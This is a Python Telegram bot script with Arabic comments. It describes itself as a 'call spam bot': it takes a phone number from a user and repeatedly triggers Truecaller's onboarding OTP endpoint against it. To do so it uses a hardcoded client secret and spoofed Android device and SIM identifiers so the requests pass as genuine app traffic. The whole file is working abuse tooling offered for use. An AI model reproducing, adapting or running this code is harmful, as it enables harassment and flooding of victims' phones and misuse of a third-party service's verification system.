import telebot
import requests
import random
import string

# طباعة الحقوق (كما وجدت في الملف الأصلي)
print("@psh_team")

# طلب التوكن من المستخدم عبر التيرمينال
token = input("token: ")
bot = telebot.TeleBot(token)

# دالة لتوليد معرف جهاز عشوائي (Random Device ID)
def gigk(length=16):
    return ''.join(random.choice(string.hexdigits) for _ in range(length)).lower()

# أمر البداية /start
@bot.message_handler(commands=['start'])
def start(message):
    # إنشاء زر الرابط (قناة المطور الموجودة في الكود الأصلي)
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("قناة المطور", url="https://t.me/SHADOWEYETTEA"))
    
    bot.reply_to(message, 
                 "اهلا بك في اول بوت سبام مكالمات \n ارسل رقم مع رمز الدولة +",
                 reply_markup=markup)

# دالة استقبال الأرقام وتنفيذ الهجوم
@bot.message_handler(func=lambda m: True)
def send_spam(message):
    number = message.text
    
    # رابط API الخاص بـ Truecaller
    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
    
    headers = {
        "Host": "account-asia-south1.truecaller.com",
        "content-type": "application/json; charset=UTF-8",
        "accept-encoding": "gzip",
        "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }
    
    # البيانات المرسلة (Payload) - لاحظ أنها معدة لمصر (EG)
    data = {
        "countryCode": "eg",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": gigk(16), # توليد آيدي عشوائي
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": ["8920022021714943876f", "8920022022805258505f"]
            },
            "language": "ar",
            "sims": [
                {"imsi": "602022207634386", "mcc": "602", "mnc": "2", "operator": "vodafone"},
                {"imsi": "602023133590849", "mcc": "602", "mnc": "2", "operator": "vodafone"}
            ],
            "storeVersion": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34
            }
        },
        "phoneNumber": number,
        "region": "region-2",
        "sequenceNo": 1
    }
    
    try:
        req = requests.post(url, json=data, headers=headers)
        bot.reply_to(message, "تم الارسال اذ الرقم غلط ما راح يوصل السبام ..!")
        print(f"Status: {req.status_code}") # طباعة الحالة في التيرمينال
    except Exception as e:
        print(f"Error: {e}")

# تشغيل البوت
bot.infinity_polling()